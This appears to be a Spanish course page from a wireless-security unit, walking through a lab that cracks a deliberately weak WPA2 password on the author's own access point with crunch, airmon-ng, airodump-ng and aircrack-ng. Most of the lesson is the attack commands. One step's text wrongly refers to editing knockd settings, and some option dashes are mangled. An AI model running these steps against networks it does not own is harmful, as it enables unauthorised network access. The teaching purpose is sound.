<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="es" xml:lang="es" xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="stylesheet" type="text/css" href="base.css" />
<link rel="stylesheet" type="text/css" href="content.css" />
<link rel="stylesheet" type="text/css" href="nav.css" />
<meta http-equiv="content-type" content="text/html;  charset=utf-8" />
<title>1.2 Averiguar contraseña Wifi con diccionario utilizando Fuerza bruta | UT7. Fortificación de la red interna: redes inalámbricas </title>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<meta http-equiv="content-language" content="es" />
<meta name="author" content="Juan Carlos Requena" />
<link rel="license" type="text/html" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" />
<meta name="generator" content="eXeLearning 2.8 - exelearning.net" />
<script type="text/javascript" src="exe_jquery.js"></script>
<script type="text/javascript" src="common_i18n.js"></script>
<script type="text/javascript" src="common.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body class="exe-web-site" id="exe-node-122"><script type="text/javascript">document.body.className+=" js"</script>
<div id="content">
<p id="skipNav"><a href="#main" class="sr-av">Saltar la navegación</a></p>
<div id="header"  style="background-image: url(logo-jcrequena.png); background-repeat: no-repeat;"><div id="headerContent">UT7. Fortificación de la red interna: redes inalámbricas</div></div>
<div id="siteNav">
<ul>
   <li><a href="index.html" class="daddy main-node">UT7. Fortificación de la red interna: redes inalámbricas</a></li>
   <li><a href="objetivos.html" class="no-ch">Objetivos</a></li>
   <li class="current-page-parent"><a href="1_seguridad_en_redes_inalmbricas.html" class="current-page-parent daddy">1. Seguridad en redes inalámbricas</a>
   <ul>
      <li><a href="11_ataques_a_redes_wifi.html" class="no-ch">1.1 Ataques a redes wifi</a></li>
      <li id="active"><a href="12_averiguar_contrasea_wifi_con_diccionario_utilizando_fuerza_bruta.html" class="active no-ch">1.2 Averiguar contraseña Wifi con diccionario utilizando Fuerza bruta</a></li>
      <li><a href="13_mecanismos_de_proteccin.html" class="no-ch">1.3 Mecanismos de protección</a></li>
   </ul>
   </li>
   <li><a href="2_protocolos_de_seguridad_inalmbrica.html" class="daddy">2. Protocolos de seguridad inalámbrica</a>
   <ul class="other-section">
      <li><a href="21_wep.html" class="no-ch">2.1 WEP</a></li>
      <li><a href="22_wpa.html" class="no-ch">2.2 WPA</a></li>
      <li><a href="23_wpa2.html" class="no-ch">2.3 WPA2</a></li>
      <li><a href="24_wpa3.html" class="no-ch">2.4 WPA3</a></li>
      <li><a href="25_wps.html" class="no-ch">2.5 WPS</a></li>
      <li><a href="26_radius.html" class="no-ch">2.6 Radius</a></li>
      <li><a href="laboratorio_1_configurar_un_dispositivo_tplink.html" class="no-ch">Laboratorio 1. Configurar un dispositivo TP-Link</a></li>
   </ul>
   </li>
   <li><a href="3_servidor_de_autenticacin_radius.html" class="daddy">3. Servidor de autenticación Radius</a>
   <ul class="other-section">
      <li><a href="31_freeradius.html" class="daddy">3.1 FreeRadius</a>
      <ul class="other-section">
         <li><a href="311_instalacin_servidor_radius.html" class="daddy">3.1.1. Instalación servidor Radius</a>
         <ul class="other-section">
            <li><a href="3111_instalacin_cliente_radius_para_pruebas.html" class="no-ch">3.1.1.1. Instalación Cliente Radius para pruebas</a></li>
         </ul>
         </li>
         <li><a href="312_configuracin_del_punto_de_acceso_o_router_inalmbrico.html" class="no-ch">3.1.2 Configuración del punto de acceso o router inalámbrico</a></li>
         <li><a href="313_acceso_del_usuario_o_suplicante.html" class="no-ch">3.1.3 Acceso del usuario o suplicante</a></li>
      </ul>
      </li>
      <li><a href="32_freeradius__validacin_con_usuarios_ldap.html" class="daddy">3.2. FreeRadius - Validación con usuarios LDAP</a>
      <ul class="other-section">
         <li><a href="321_instalar_openldap.html" class="no-ch">3.2.1 Instalar openLDAP</a></li>
         <li><a href="322_instalacin_y_configuracin_de_freeradius_como_aaa_server.html" class="no-ch">3.2.2 Instalación y configuración de FreeRADIUS como AAA Server</a></li>
         <li><a href="323_configuracin_del_cliente_radius.html" class="no-ch">3.2.3 Configuración del cliente Radius</a></li>
         <li><a href="324_acceso_del_usuario_o_suplicante.html" class="no-ch">3.2.4 Acceso del usuario o suplicante</a></li>
         <li><a href="proyecto_red_wpa2enterprise_con_servidor_radius_y_usuarios_openldap.html" class="no-ch">Proyecto. Red WPA2/Enterprise con servidor Radius y usuarios OpenLDAP</a></li>
      </ul>
      </li>
      <li><a href="33_servidor_radius_en_windows_server_2019_para_conexiones_inalmbricas_8021x.html" class="daddy">3.3. Servidor RADIUS en Windows Server 2019 para conexiones inalámbricas 802.1X</a>
      <ul class="other-section">
         <li><a href="331_crear_un_certificado_de_equipo_autofirmado.html" class="no-ch">3.3.1 Crear un certificado de equipo autofirmado</a></li>
         <li><a href="332_instalar_y_configurar_npsradius_en_windows_server.html" class="no-ch">3.3.2 Instalar y configurar NPS/Radius en Windows Server</a></li>
         <li><a href="333_configurar_el_routerap.html" class="no-ch">3.3.3 Configurar el router-AP</a></li>
         <li><a href="334_acceso_a_la_infraestructura_por_usuario_suplicante.html" class="no-ch">3.3.4 Acceso a la infraestructura por usuario suplicante</a></li>
      </ul>
      </li>
      <li><a href="34_servidor_aaa_en_gns3.html" class="no-ch">3.4 Servidor AAA en gns3</a></li>
   </ul>
   </li>
   <li><a href="4_hotspot.html" class="daddy">4. Hotspot</a>
   <ul class="other-section">
      <li><a href="41_hotspot_con_mikrotik.html" class="no-ch">4.1 HotSpot con MikroTik</a></li>
      <li><a href="prctica_2_hotspot_radius.html" class="no-ch">Práctica 2. Hotspot Radius</a></li>
   </ul>
   </li>
</ul>
</div>
<div id='topPagination'>
<div class="pagination noprt">
<a href="11_ataques_a_redes_wifi.html" class="prev"><span><span>&laquo; </span>Anterior</span></a> <span class="sep">| </span><a href="13_mecanismos_de_proteccin.html" class="next"><span>Siguiente<span> &raquo;</span></span></a>
</div>
</div>
<div id="main-wrapper">
<div id="main"><a name="main"></a>
<div id="nodeDecoration"><h1 id="nodeTitle">1.2 Averiguar contraseña Wifi con diccionario utilizando Fuerza bruta</h1></div>
<div class="iDevice_wrapper textIdevice" id="id161">
<div class="iDevice emphasis0" >
<div id="ta161_161_2" class="block iDevice_content">
<div class="exe-text"><h3><span>1. Introducción</span></h3>
<p style="text-align: justify;">En este apartado se describe como crackear un password débil WPA2 de un punto de acceso Wifi compuesto de 8 caracteres númericos usando solamente dígitos (1 2 3 4).<span></span></p>
<h3><span>2. Recursos necesarios</span></h3>
<ul>
<li><span>Instalar:</span>
<ul>
<li>aircrack-ng.</li>
<li>airmon-ng.</li>
<li>airodump-ng.</li>
<li><span style="color: #333333; font-size: 1em;">crunch: Para generar contraseñas.</span></li>
</ul>
</li>
</ul>
<h3><span>2. Procedimiento</span></h3>
<p style="text-align: justify;"><span>En primer lugar hay que crearse un punto de acceso wifi en Mikrotik y establecer un password de la red Wifi de 8 caracteres utilizando las cifras 1 2 3 y 4 (password débil), para este caso de ejemplo, se crea el password de 8 caracteres <strong>11114444</strong>.</span></p>
<p style="text-align: center;"><img src="aircrack-01.png" alt="" width="1550" height="723" /></p>
<h4>2.1 Instalación de paquetes necesarios</h4>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong>apt install -y aircrack-ng crunch</span></span></pre>
<h4>2.2 Crear el diccionario de passwords</h4>
<p style="text-align: justify;">Hay que generar un archivo de passwords con todas las combinaciones posibles de 8 caracteres utilizando las cifras 1 2 3 y 4.</p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong>crunch 8 8 1234 -o passwords.txt</span><br /></span></pre>
<h4>2.3 Crear directorio para capturas</h4>
<p>Hay que establecer la interfaz sobre la que se escucha, para ello se edita el fichero <span><span style="font-size: 12pt;">knockd y se modifica el parámetro KNOCKD_OPTS:</span></span></p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong>mkdir /home/administrador/capturas</span></span></pre>
<h4>2.4 Consultar el canal donde emite la wifi a crackear</h4>
<p> Para consultar el canal donde está emitiendo la wifi que se quiere crackear (SSID CAMBIAR_SSID), el comando es:</p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong>iwlist &lt;interfaz_wifi&gt; scan</span></span></pre>
<p>donde,</p>
<ul>
<li><strong>interfaz_wifi:</strong> Es la interfaz wifi del equipo, ejemplo: wlp2s0.</li>
</ul>
<p style="text-align: center;"><img src="canal.png" alt="" width="653" height="337" /><span style="font-size: 10pt;"></span></p>
<p style="text-align: justify;"><span style="font-size: 12pt;">Como se observa en la figura superior, el canal es el 9.</span></p>
<h4>2.5 Poner la interfaz wifi en modo monitor</h4>
<p style="text-align: justify;"><span style="font-size: 10pt;"></span>Una vez detectado el canal, hay que lanzar airmon-ng en la interfaz wifi del equipo en modo monitor promiscuo en el canal 9.</p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong></span></span><span style="font-size: 12pt;"> airmon-ng start wlp2s0 9</span></pre>
<p style="text-align: center;"><img src="airmon-ng.png" alt="" width="955" height="215" /></p>
<p>Si se ejecuta iwconfig, se puede ver si ahora la interfaz está en  modo monitor:</p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong>iwconfig</span></span></pre>
<p style="text-align: center;"><img src="modo-monitor.png" alt="" width="827" height="79" /></p>
<h4>2.6 Consultar las redes disponibles</h4>
<p>Para consultar las redes disponibles, el comando es el siguiente:</p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong></span></span><span style="font-size: 12pt;"> airodump-ng wlp2s0mon</span></pre>
<p style="text-align: center;"><img src="wifis-disponibles.png" alt="" width="986" height="315" /></p>
<p style="text-align: justify;">Una vez se tiene la lista, hay que apuntar la MAC del punto de acceso en estudio, que para este caso es, CAMBIAR_SSSID. La MAC es: 08:55:31:FC:A0:66.</p>
<h4>2.7 Iniciar la captura de paquetes</h4>
<p>Una vez se ha obtenido la MAC de la red Wifi a crackear, se comienza el proceso de captura de todos los paquetes de ese punto de acceso.</p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong></span></span><span style="font-size: 12pt;"> airodump-ng –channel 9 –bssid 08:55:31:FC:A0:66 -w /home/administrador/capturas/ wlp2s0mon</span></pre>
<p style="text-align: justify;">Una vez se ejecuta el comando, se inicia la captura de paquetes pero lo que interesa es, capturar los paquetes del <strong>handshake </strong>que es donde se negocia la contraseña.</p>
<div class="cuadro-nota-centro-new">
<p style="text-align: justify;">Para capturar un handshake, se puede forzar la reconexión de algún cliente con aireplay, pero para realizarlo rápido, se conecta y desconecta el wifi de un cliente móvil.</p>
</div>
<p style="text-align: justify;">Una vez se fuerza un <strong>handshake</strong>, hay que parar la captura de paquetes con Ctrl+C.</p>
<p style="text-align: justify;">A continuación, hay que acceder al directorio capturas y se observar los ficheros .cap que son las capturas de los paquetes de red que se han obtenido.</p>
<p style="text-align: justify;">Con el <span style="font-size: 12pt;">aircrack</span>, se intenta obtener el password del punto de acceso a partir de los fichero cap obtenidos, dando como fichero de passwords el construido anteriormente (<span style="font-size: 12pt;">passwords.txt).</span></p>
<pre class="wp-block-preformatted"><span><span style="font-size: 12pt;"><strong>root@orion:/#</strong></span></span><span style="font-size: 12pt;"> aircrack-ng -a2 -b 08:55:31:FC:A0:66 -w passwords.txt /home/administrador/capturas/*.cap</span></pre>
<p style="text-align: center;"><img src="found-password.png" alt="" width="713" height="306" /></p>
<p style="text-align: justify;"></p></div>
</div>
</div>
</div>
<div id="packageLicense" class="cc cc-by-nc-sa">
<p><span>Obra publicada con</span> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Licencia Creative Commons Reconocimiento No comercial Compartir igual 4.0</a></p>
</div>
</div>
</div>
<div id='bottomPagination'>
<div class="pagination noprt">
<a href="11_ataques_a_redes_wifi.html" class="prev"><span><span>&laquo; </span>Anterior</span></a> <span class="sep">| </span><a href="13_mecanismos_de_proteccin.html" class="next"><span>Siguiente<span> &raquo;</span></span></a>
</div>
</div>
</div>
<p id="made-with-eXe"><a href="https://exelearning.net/" target="_blank" rel="noopener"><span>Creado con eXeLearning<span> (Ventana nueva)</span></span></a></p><script type="text/javascript" src="_style_js.js"></script></body></html>